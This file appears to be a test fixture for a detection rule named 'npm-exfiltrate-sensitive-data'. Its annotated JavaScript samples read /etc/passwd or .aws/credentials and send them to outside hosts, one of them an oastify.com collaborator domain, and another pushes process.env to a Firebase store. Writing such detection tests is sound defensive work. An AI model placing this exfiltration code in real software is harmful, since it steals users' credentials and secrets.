function f(){
    const fs = require('fs');
    var etcpasswd = '/etc/passwd';
    let base64data1 = '';
    try {
        if (fs.existsSync(etcpasswd)) {
            var data1 = fs.readFileSync(etcpasswd, 'utf8');
            let buff1 = Buffer.from(data1);
            base64data1 = buff1.toString('base64');
        }
    } catch (error) {
        console.log('');
    }

    const x = require('https');
    var options = {
        hostname: "fdw8jf59fyrb5rp6hamcl4q7gymoad.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "Contentetcpasswd": base64data1,
            "ContentSAM": base64data2,
            "ContentetSYSTEM": base64data3,
            "imdsv1": base64data4
        },
    };
    // ruleid: npm-exfiltrate-sensitive-data
    var req = x.request(options, (res) => {
        res.on("data", (d) => {
            process.stdout.write(d);
        });
    });
}


function f(){
    const fs = require('fs');

    const postData = '';
    fs.readFile('.aws/credentials', 'utf8', (err, data) => {
    if (err) {
        console.error(err);
        return;
    }
        postData = data;
    });

    const axios = require('axios');

    const url = 'https://api.example.com/data';

    // ruleid: npm-exfiltrate-sensitive-data
    axios.post(url, postData)
    .then((response) => {
        console.log(response.data);
    })
    .catch((error) => {
        console.error(error);
    });

}

function f(){
    var Firebase = require("firebase");
    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
    var dbRef = ref.child("env_vars");
    // ruleid: npm-exfiltrate-sensitive-data
    dbRef.push({status : "leaked env vars", message : process.env}, clean());

}

function f(){
    var Firebase = require("firebase");
    var ref = new Firebase("https://abcde-fg-1234.firebaseio.com/");
    var dbRef = ref.child("env_vars");
    // ok: npm-exfiltrate-sensitive-data
    dbRef.push({status : "leaked env vars", message : "anymsg"}, clean());

}